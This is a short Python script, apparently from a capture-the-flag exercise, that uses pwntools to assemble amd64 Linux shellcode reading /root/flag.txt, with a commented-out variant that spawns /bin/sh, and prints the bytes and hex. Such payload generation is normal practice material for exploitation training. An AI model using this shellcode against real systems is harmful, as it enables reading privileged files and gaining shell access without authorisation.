#!/bin/python3

from pwn import *

context(os="linux", arch="amd64", log_level="error")

# Syscall and args
# syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) 
syscall = pwnlib.shellcraft.amd64.linux.cat('/root/flag.txt')

# Generate shellcode
sc = asm(syscall)
print(f'Shellcode contains N bytes: {len(sc)}\n')
print(f'{sc}\n')
print(sc.hex())
